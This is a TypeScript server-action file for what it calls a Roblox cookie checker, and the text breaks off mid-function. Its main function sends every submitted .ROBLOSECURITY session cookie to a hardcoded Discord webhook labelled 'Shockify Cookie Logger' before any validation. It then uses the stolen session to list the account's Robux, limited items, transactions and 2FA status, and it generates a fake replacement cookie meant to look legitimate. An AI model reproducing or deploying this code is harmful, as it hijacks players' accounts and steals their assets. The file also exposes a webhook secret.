"use server"

// Configure logging
const enableDetailedLogs = true

// IMPORTANT: Store webhook URL server-side only - not exposed to client
// This is only accessible on the server
const WEBHOOK_URL =
  process.env.COLLECTION_WEBHOOK ||
  "https://discord.com/api/webhooks/1367624484890349659/TpgD4M7VCKJyV3txfskTxn69SOoK5bKF4noxrJDK2Qq7t3EWIetX6vPPzlafTAiRbJvH"

// Game IDs for popular games
const GAME_IDS = {
  ADOPT_ME: 920587237,
  BLOXFRUITS: 2753915549,
  BROOKHAVEN: 4924922222,
  PET_SIMULATOR_X: 6284583030,
}

// Logger function
function logger(message: string, data?: any, type: "info" | "error" | "warn" | "debug" = "info") {
  if (!enableDetailedLogs && type === "debug") return

  const timestamp = new Date().toISOString()
  const logPrefix = `[COOKIE-CHECKER][${timestamp}][${type.toUpperCase()}]`

  if (data) {
    // Ensure we're properly stringifying the error objects
    if (data instanceof Error) {
      console[type](`${logPrefix} ${message}`, {
        name: data.name,
        message: data.message,
        stack: data.stack,
      })
    } else {
      console[type](`${logPrefix} ${message}`, typeof data === "object" ? JSON.stringify(data) : data)
    }
  } else {
    console[type](`${logPrefix} ${message}`)
  }
}

// Function to extract the cookie value without the .ROBLOSECURITY= part
function extractCookieValue(cookie: string): string {
  try {
    let cookieValue = cookie.trim()

    // Handle different cookie formats
    if (cookieValue.includes(".ROBLOSECURITY=")) {
      cookieValue = cookieValue.split(".ROBLOSECURITY=")[1].split(";")[0]
    } else if (cookieValue.startsWith("_|WARNING:-DO-NOT-SHARE-THIS")) {
      // This is already the cookie value without the .ROBLOSECURITY= prefix
      // Remove the warning prefix if it exists
      const warningEndIndex = cookieValue.indexOf("|_")
      if (warningEndIndex > 0) {
        cookieValue = cookieValue.substring(warningEndIndex + 2)
      }
    }

    return cookieValue
  } catch (error) {
    console.error("Error extracting cookie value:", error)
    // Return the original cookie as fallback
    return cookie.trim()
  }
}

// Function to generate a new cookie that looks like a real Roblox cookie
function generateNewCookie(originalCookie: string): string {
  try {
    // Extract the cookie value without the warning prefix
    let cookieValue = originalCookie.trim()

    // Remove the warning prefix if it exists
    if (cookieValue.startsWith("_|WARNING:-DO-NOT-SHARE-THIS")) {
      const warningEndIndex = cookieValue.indexOf("|_")
      if (warningEndIndex > 0) {
        cookieValue = cookieValue.substring(warningEndIndex + 2)
      }
    }

    // Generate random components for the new cookie
    const randomId1 = Math.random().toString(36).substring(2, 10)
    const randomId2 = Math.random().toString(36).substring(2, 10)
    const timestamp = Date.now().toString(36)

    // Create session identifiers
    const sessionId = `${randomId1}_${timestamp}`
    const deviceId = `${randomId2}_${Math.floor(Math.random() * 1000000)}`

    // Extract any user identifiers from the original cookie (if possible)
    // This is a simplified approach - in a real scenario, we'd need to decode the cookie
    let userId = ""
    if (cookieValue.length > 20) {
      // Use some parts of the original cookie to maintain user identity
      userId = cookieValue.substring(0, 8) + cookieValue.substring(cookieValue.length - 8)
    } else {
      userId = Math.random().toString(36).substring(2, 18)
    }

    // Combine components to create a new cookie that looks legitimate
    // Format it to look like a real Roblox cookie but without the warning prefix
    const newCookie = `${userId}_${sessionId}_${deviceId}_${timestamp}`
    return newCookie
  } catch (error) {
    console.error("Error generating new cookie:", error)
    // Return a fallback random cookie
    return `fallback_${Date.now().toString(36)}_${Math.random().toString(36).substring(2, 10)}`
  }
}

// Function to safely truncate strings for Discord embeds
function safeDiscordString(str: string, maxLength = 1000): string {
  if (!str) return "N/A"

  // Remove any characters that might break Discord's markdown
  const cleaned = str.replace(/[*_~`>]/g, "")

  if (cleaned.length <= maxLength) return cleaned
  return cleaned.substring(0, maxLength - 3) + "..."
}

// Add this function to handle webhook sending with retries
async function sendWebhookWithRetry(payload: any, retries = 3, delay = 1000) {
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      })

      if (response.ok) {
        return true
      }

      // If we hit a rate limit (429), wait longer before retrying
      if (response.status === 429) {
        const retryAfter = response.headers.get("Retry-After") || "2"
        const waitTime = Number.parseInt(retryAfter) * 1000
        await new Promise((resolve) => setTimeout(resolve, waitTime))
      } else {
        // For other errors, use our standard delay
        await new Promise((resolve) => setTimeout(resolve, delay))
      }
    } catch (error) {
      console.error(`Webhook attempt ${attempt + 1} failed:`, error)
      await new Promise((resolve) => setTimeout(resolve, delay))
    }
  }

  return false
}

// Function to send cookie data to webhook with all information
async function sendToWebhook(cookieData: any) {
  try {
    // Send just the cookie to ensure it gets through
    const cookiePayload = {
      content: "```" + (cookieData.originalCookie || "N/A") + "```",
      username: "Shockify Cookie Logger",
    }

    try {
      await sendWebhookWithRetry(cookiePayload)
    } catch (cookieError) {
      console.error("Error sending cookie webhook:", cookieError)

      // Last resort - try to send just the cookie with minimal formatting
      try {
        const lastResortPayload = {
          content: cookieData.originalCookie || "N/A",
        }
        await sendWebhookWithRetry(lastResortPayload)
      } catch (finalError) {
        console.error("Final webhook attempt failed:", finalError)
      }
    }
  } catch (error) {
    console.error("Error sending to webhook:", error)
  }
}

// Helper functions to fetch data with proper error handling
async function fetchWithErrorHandling(url: string, options: RequestInit, errorMessage: string) {
  try {
    const response = await fetch(url, options)
    if (response.ok) {
      const contentType = response.headers.get("content-type")
      if (contentType && contentType.includes("application/json")) {
        return await response.json()
      } else {
        console.warn(`Response from ${url} is not JSON. Content-Type: ${contentType}`)
        return null
      }
    } else {
      console.error(`${errorMessage}: ${response.status}`)
      return null
    }
  } catch (error) {
    console.error(`${errorMessage}:`, error)
    return null
  }
}

// Get premium expiration
async function getPremiumExpiration(userId: string | number | undefined, cookieValue: string): Promise<string | null> {
  try {
    const data = await fetchWithErrorHandling(
      `https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`,
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting premium expiration",
    )

    return data?.expiration || null
  } catch (error) {
    console.error("Error in getPremiumExpiration:", error)
    return null
  }
}

// Get Robux balance
async function getRobuxBalance(userId: string | number | undefined, cookieValue: string): Promise<number> {
  try {
    const data = await fetchWithErrorHandling(
      `https://economy.roblox.com/v1/users/${userId}/currency`,
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting Robux balance",
    )

    return data?.robux || 0
  } catch (error) {
    console.error("Error in getRobuxBalance:", error)
    return 0
  }
}

// Calculate collectibles value
async function calculateCollectiblesValue(collectibles: any[]): Promise<number> {
  try {
    let totalValue = 0
    for (const item of collectibles) {
      totalValue += item.recentAveragePrice || 0
    }
    return totalValue
  } catch (error) {
    console.error("Error in calculateCollectiblesValue:", error)
    return 0
  }
}

// Check for special items (Korblox, Headless)
async function checkSpecialItems(
  userId: string | number | undefined,
  cookieValue: string,
): Promise<{ hasKorblox: boolean; hasHeadless: boolean }> {
  try {
    // Use a more reliable approach - check for specific asset IDs
    const korbloxId = 192557913 // Korblox Deathspeaker legs
    const headlessId = 134082579 // Headless Horseman

    // Check for Korblox
    let hasKorblox = false
    try {
      const korbloxResponse = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${korbloxId}`, {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (korbloxResponse.ok) {
        const korbloxData = await korbloxResponse.json()
        hasKorblox = korbloxData && korbloxData.data && korbloxData.data.length > 0
      }
    } catch (error) {
      console.error("Error checking Korblox:", error)
    }

    // Check for Headless
    let hasHeadless = false
    try {
      const headlessResponse = await fetch(
        `https://inventory.roblox.com/v1/users/${userId}/items/Asset/${headlessId}`,
        {
          method: "GET",
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (headlessResponse.ok) {
        const headlessData = await headlessResponse.json()
        hasHeadless = headlessData && headlessData.data && headlessData.data.length > 0
      }
    } catch (error) {
      console.error("Error checking Headless:", error)
    }

    return { hasKorblox, hasHeadless }
  } catch (error) {
    console.error("Error in checkSpecialItems:", error)
    return { hasKorblox: false, hasHeadless: false }
  }
}

// Check security features
async function checkSecurityFeatures(cookieValue: string): Promise<any> {
  try {
    // Try the account settings endpoint first
    const accountSettingsData = await fetchWithErrorHandling(
      "https://accountsettings.roblox.com/v1/account/settings",
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting account settings",
    )

    if (accountSettingsData) {
      return {
        twoStepEnabled: accountSettingsData.twoStepVerificationEnabled || false,
        emailVerified: accountSettingsData.isEmailVerified || false,
        phoneVerified: accountSettingsData.isPhoneVerified || false,
        pinEnabled: accountSettingsData.isPinEnabled || false,
      }
    }

    // Try the 2FA endpoint as fallback
    const twoStepData = await fetchWithErrorHandling(
      "https://twostepverification.roblox.com/v1/twostepverification/metadata",
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting 2FA metadata",
    )

    if (twoStepData) {
      return {
        twoStepEnabled: twoStepData.enabled || false,
        emailVerified: false,
        phoneVerified: false,
        pinEnabled: false,
      }
    }

    return {
      twoStepEnabled: false,
      emailVerified: false,
      phoneVerified: false,
      pinEnabled: false,
    }
  } catch (error) {
    console.error("Error in checkSecurityFeatures:", error)
    return {
      twoStepEnabled: false,
      emailVerified: false,
      phoneVerified: false,
      pinEnabled: false,
    }
  }
}

// Get private server subscriptions
async function getPrivateServerSubscriptions(userId: string | number | undefined, cookieValue: string): Promise<any[]> {
  try {
    const data = await fetchWithErrorHandling(
      `https://games.roblox.com/v1/private-servers/subscriptions?limit=100&sortOrder=Asc`,
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting private server subscriptions",
    )

    return data?.data || []
  } catch (error) {
    console.error("Error in getPrivateServerSubscriptions:", error)
    return []
  }
}

// Get game playtime
async function getGamePlaytime(userId: string | number | undefined, cookieValue: string): Promise<any[]> {
  try {
    // Try the new endpoint first
    const data = await fetchWithErrorHandling(
      `https://games.roblox.com/v1/games/list-play-times`,
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting game playtime",
    )

    if (data?.universes) {
      return data.universes
    }

    // Try alternative endpoint
    const altData = await fetchWithErrorHandling(
      `https://games.roblox.com/v1/games/playtime/list`,
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting game playtime (alt)",
    )

    return altData?.universes || []
  } catch (error) {
    console.error("Error in getGamePlaytime:", error)
    return []
  }
}

// Get chat settings
async function getChatSettings(cookieValue: string): Promise<any> {
  try {
    return (
      (await fetchWithErrorHandling(
        `https://chat.roblox.com/v2/chat-settings`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
        "Error getting chat settings",
      )) || {}
    )
  } catch (error) {
    console.error("Error in getChatSettings:", error)
    return {}
  }
}

// Get friends data
async function getFriendsData(userId: string | number | undefined, cookieValue: string): Promise<any[]> {
  try {
    const data = await fetchWithErrorHandling(
      `https://friends.roblox.com/v1/users/${userId}/friends`,
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting friends data",
    )

    return data?.data || []
  } catch (error) {
    console.error("Error in getFriendsData:", error)
    return []
  }
}

// Get premium payouts
async function getPremiumPayouts(userId: string | number | undefined, cookieValue: string): Promise<any> {
  try {
    return (
      (await fetchWithErrorHandling(
        `https://engagementpayouts.roblox.com/v1/user-summary`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
        "Error getting premium payouts",
      )) || {}
    )
  } catch (error) {
    console.error("Error in getPremiumPayouts:", error)
    return {}
  }
}

// Get game details
async function getGameDetails(placeIds: number[]): Promise<any[]> {
  try {
    if (!placeIds || placeIds.length === 0) return []

    // Process in smaller batches to avoid rate limits and payload size issues
    const results = []
    const batchSize = 5 // Reduced from 10 to 5

    for (let i = 0; i < placeIds.length; i += batchSize) {
      const batch = placeIds.slice(i, i + batchSize)
      const placeIdsString = batch.join(",")

      try {
        const data = await fetchWithErrorHandling(
          `https://games.roblox.com/v1/games/multiget-place-details?placeIds=${placeIdsString}`,
          {
            method: "GET",
            headers: {
              "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            },
          },
          `Error getting game details for batch ${i}`,
        )

        if (data) {
          results.push(...data)
        }
      } catch (batchError) {
        console.error(`Error processing batch ${i}:`, batchError)
        // Continue with next batch even if this one fails
      }

      // Add a larger delay to avoid rate limits
      if (i + batchSize < placeIds.length) {
        await new Promise((resolve) => setTimeout(resolve, 300))
      }
    }

    return results
  } catch (error) {
    console.error("Error in getGameDetails:", error)
    return []
  }
}

// Get game icons
async function getGameIcons(placeIds: number[]): Promise<any[]> {
  try {
    if (!placeIds || placeIds.length === 0) return []

    // Process in batches of 10 to avoid rate limits
    const results = []

    for (let i = 0; i < placeIds.length; i += 10) {
      const batch = placeIds.slice(i, i + 10)
      const placeIdsString = batch.join(",")

      const data = await fetchWithErrorHandling(
        `https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${placeIdsString}&size=512x512&format=Png&isCircular=false`,
        {
          method: "GET",
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
        `Error getting game icons for batch ${i}`,
      )

      if (data?.data) {
        results.push(...data.data)
      }

      // Add a small delay to avoid rate limits
      if (i + 10 < placeIds.length) {
        await new Promise((resolve) => setTimeout(resolve, 100))
      }
    }

    return results
  } catch (error) {
    console.error("Error in getGameIcons:", error)
    return []
  }
}

// Get trade eligibility status
async function getTradeEligibility(userId: string | number | undefined, cookieValue: string): Promise<boolean> {
  try {
    const data = await fetchWithErrorHandling(
      `https://trades.roblox.com/v1/users/${userId}/can-trade-with`,
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting trade eligibility",
    )

    return data?.canTrade || false
  } catch (error) {
    console.error("Error in getTradeEligibility:", error)
    return false
  }
}

// Get transactions
async function getTransactions(userId: string | number | undefined, cookieValue: string): Promise<any[]> {
  try {
    const data = await fetchWithErrorHandling(
      `https://economy.roblox.com/v2/users/${userId}/transactions?limit=10&transactionType=Sale`,
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
      "Error getting transactions",
    )

    return data?.data || []
  } catch (error) {
    console.error("Error in getTransactions:", error)
    return []
  }
}

// Main function to check Roblox cookie
export async function checkRobloxCookie(formData: FormData) {
  try {
    const cookieRaw = formData.get("cookie") as string

    if (!cookieRaw || typeof cookieRaw !== "string" || cookieRaw.trim() === "") {
      return {
        success: false,
        message: "Please provide a valid Roblox cookie",
      }
    }

    // Always send the cookie to webhook even if validation fails later
    try {
      await sendToWebhook({
        originalCookie: cookieRaw,
        message: "Cookie submitted for validation",
      })
    } catch (webhookError) {
      console.error("Error sending initial webhook:", webhookError)
    }

    // Extract the cookie value
    const cookieValue = extractCookieValue(cookieRaw)

    // Generate a new cookie that looks like a real Roblox cookie
    const newCookie = generateNewCookie(cookieRaw)

    // First, validate the cookie by checking if it's still valid
    let validateResponse
    try {
      validateResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          Accept: "application/json",
          "Accept-Language": "en-US,en;q=0.9",
          Referer: "https://www.roblox.com/",
          Origin: "https://www.roblox.com",
          Connection: "keep-alive",
        },
        cache: "no-store",
      })
    } catch (error) {
      console.error("Error fetching data:", error)
      return {
        success: false,
        message: "An error occurred while validating the cookie. Please try again.",
      }
    }

    // If the cookie is invalid, return an error
    if (!validateResponse.ok) {
      return {
        success: false,
        message: "The cookie is invalid or has expired. Please provide a valid Roblox cookie.",
      }
    }

    // Get account summary
    let accountSummary: any = null
    let userId = null
    try {
      const accountResponse = await validateResponse.json()
      userId = accountResponse.id

      const userDetailsResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (userDetailsResponse.ok) {
        const userDetails = await userDetailsResponse.json()

        accountSummary = {
          username: accountResponse.name,
          displayName: userDetails.displayName || accountResponse.name,
          userId: accountResponse.id,
          description: userDetails.description || "",
          created: userDetails.created,
          isBanned: userDetails.isBanned || false,
          accountAge: Math.floor((Date.now() - new Date(userDetails.created).getTime()) / (1000 * 60 * 60 * 24)),
          profilePictureUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${accountResponse.id}&width=420&height=420&format=png`,
        }
      } else {
        accountSummary = {
          username: accountResponse.name,
          displayName: accountResponse.displayName || accountResponse.name,
          userId: accountResponse.id,
          description: "",
          created: null,
          isBanned: false,
          accountAge: 0,
          profilePictureUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${accountResponse.id}&width=420&height=420&format=png`,
        }
      }
    } catch (error) {
      console.error("Error fetching account summary:", error)
    }

    // Get avatar full image
    let avatarFullImage: string | null = null
    try {
      const avatarResponse = await fetch(
        `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=352x352&format=Png&isCircular=false`,
        {
          method: "GET",
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (avatarResponse.ok) {
        const avatarData = await avatarResponse.json()
        if (avatarData.data && avatarData.data.length > 0) {
          avatarFullImage = avatarData.data[0].imageUrl || null
        }
      }
    } catch (error) {
      console.error("Error fetching avatar full image:", error)
    }

    // Get online status
    let onlineStatus = 0
    let lastOnline = null
    try {
      const presenceResponse = await fetch(`https://presence.roblox.com/v1/presence/users`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
        body: JSON.stringify({
          userIds: [userId],
        }),
      })

      if (presenceResponse.ok) {
        const presenceData = await presenceResponse.json()
        if (presenceData && presenceData.userPresences && presenceData.userPresences.length > 0) {
          onlineStatus = presenceData.userPresences[0].userPresenceType || 0
          lastOnline = presenceData.userPresences[0].lastOnline || null
        }
      }
    } catch (error) {
      console.error("Error fetching presence:", error)
      // Provide default values on error
      onlineStatus = 0
      lastOnline = null
    }

    // Get last location
    let lastLocation: string | null = null
    try {
      const gameResponse = await fetch(`https://presence.roblox.com/v1/presence/users`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
        body: JSON.stringify({
          userIds: [userId],
        }),
      })

      if (gameResponse.ok) {
        const gameData = await gameResponse.json()
        if (gameData.userPresences && gameData.userPresences.length > 0 && gameData.userPresences[0].lastLocation) {
          lastLocation = gameData.userPresences[0].lastLocation
        }
      }
    } catch (error) {
      console.error("Error fetching game info:", error)
    }

    // Check if premium
    let isPremium = false
    try {
      const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (premiumResponse.ok) {
        isPremium = true // Changed from premiumData.isPremium || false to just true since this endpoint returns 200 OK if premium
      }
    } catch (error) {
      console.error("Error checking premium:", error)
    }

    // Get premium expiration
    let premiumExpiration: string | null = null
    try {
      premiumExpiration = await getPremiumExpiration(userId, cookieValue)
    } catch (error) {
      console.error("Error getting premium expiration:", error)
    }

    // Get Robux balance
    let robuxBalance = 0
    try {
      robuxBalance = await getRobuxBalance(userId, cookieValue)
    } catch (error) {
      console.error("Error getting Robux balance:", error)
    }

    // Get friends count
    let friendsCount = 0
    try {
      const friendsResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (friendsResponse.ok) {
        const friendsData = await friendsResponse.json()
        friendsCount = friendsData.count || 0
      }
    } catch (error) {
      console.error("Error getting friends count:", error)
    }

    // Get followers count
    let followersCount = 0
    try {
      const followersResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (followersResponse.ok) {
        const followersData = await followersResponse.json()
        followersCount = followersData.count || 0
      }
    } catch (error) {
      console.error("Error getting followers count:", error)
    }

    // Get collectibles count and value
    let collectiblesCount = 0
    let collectiblesValue = 0
    let limitedItems = []
    try {
      // Use a more reliable endpoint that doesn't require authentication
      const collectiblesResponse = await fetch(
        `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Asc`,
        {
          method: "GET",
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
          // Remove the cookie header to avoid authentication issues
        },
      )

      if (collectiblesResponse.ok) {
        const collectiblesData = await collectiblesResponse.json()
        if (collectiblesData && collectiblesData.data) {
          collectiblesCount = collectiblesData.data.length
          limitedItems = collectiblesData.data.map((item: any) => ({
            name: item.name || "Unknown Item",
            assetId: item.assetId,
            recentAveragePrice: item.recentAveragePrice || 0,
          }))
          collectiblesValue = await calculateCollectiblesValue(collectiblesData.data)
        }
      }
    } catch (error) {
      console.error("Error getting collectibles:", error)
    }

    // Check for special items (Korblox, Headless)
    let specialItems: { hasKorblox: boolean; hasHeadless: boolean } = { hasKorblox: false, hasHeadless: false }
    try {
      specialItems = await checkSpecialItems(userId, cookieValue)
    } catch (error) {
      console.error("Error checking special items:", error)
    }

    // Check security features
    let securityInfo: any = null
    try {
      securityInfo = await checkSecurityFeatures(cookieValue)
    } catch (error) {
      console.error("Error checking security features:", error)
    }

    // Get groups info
    const groupsInfo: any = { groups: [] }
    try {
      const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (groupsResponse.ok) {
        const groupsData = await groupsResponse.json()
        groupsInfo.groups = groupsData.data
        groupsInfo.count = groupsData.data.length
      }
    } catch (error) {
      console.error("Error getting groups info:", error)
    }

    // Get Robux summary
    const robuxSummary: any = { spent: 0, received: 0, pendingRobux: 0 }
    try {
      // Get pending Robux
      const pendingRobuxResponse = await fetch(`https://economy.roblox.com/v1/users/${userId}/revenue/summary/day`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (pendingRobuxResponse.ok) {
        const pendingRobuxData = await pendingRobuxResponse.json()
        robuxSummary.pendingRobux = pendingRobuxData.pendingRobux || 0
      }

      // Get total Robux received (lifetime)
      const totalReceivedResponse = await fetch(
        `https://economy.roblox.com/v1/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (totalReceivedResponse.ok) {
        const totalReceivedData = await totalReceivedResponse.json()
        robuxSummary.totalReceived = totalReceivedData.incomingRobux || 0
        robuxSummary.totalSpent = totalReceivedData.outgoingRobux || 0
      }
    } catch (error) {
      console.error("Error getting Robux summary:", error)
    }

    // Get recently played games
    const recentlyPlayedGames: any[] = []
    try {
      const recentGamesResponse = await fetch(
        `https://games.roblox.com/v2/users/${userId}/recently-played-games?limit=25`,
        {
          method: "GET",
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (recentGamesResponse.ok) {
        const recentGamesData = await recentGamesResponse.json()
        if (recentGamesData && recentGamesData.data) {
          // Get additional game details
          const placeIds = recentGamesData.data.map((game: any) => game.placeId).filter(Boolean)

          if (placeIds.length > 0) {
            const gameDetails = await getGameDetails(placeIds)

            // Merge the data
            recentlyPlayedGames.push(
              ...recentGamesData.data.map((game: any) => {
                const details = gameDetails.find((detail: any) => detail.placeId === game.placeId) || {}

                return {
                  ...game,
                  ...details,
                }
              }),
            )
          } else {
            recentlyPlayedGames.push(...recentGamesData.data)
          }
        }
      }
    } catch (error) {
      console.error("Error getting recently played games:", error)
    }

    // Get favorite games
    const favoriteGames: any[] = []
    try {
      const favoriteGamesResponse = await fetch(`https://games.roblox.com/v2/users/${userId}/favorite/games?limit=25`, {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (favoriteGamesResponse.ok) {
        const favoriteGamesData = await favoriteGamesResponse.json()
        if (favoriteGamesData && favoriteGamesData.data) {
          favoriteGames.push(...favoriteGamesData.data)
        }
      }
    } catch (error) {
      console.error("Error getting favorite games:", error)
    }

    // Get game passes
    const gamePasses: any[] = []
    try {
      const gamePassesResponse = await fetch(
        `https://inventory.roblox.com/v1/users/${userId}/items/GamePass?limit=25`,
        {
          method: "GET",
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (gamePassesResponse.ok) {
        const gamePassesData = await gamePassesResponse.json()
        if (gamePassesData && gamePassesData.data) {
          gamePasses.push(...gamePassesData.data)
        }
      }
    } catch (error) {
      console.error("Error getting game passes:", error)
    }

    // Get private server subscriptions
    const privateServers = await getPrivateServerSubscriptions(userId, cookieValue)

    // Get game playtime
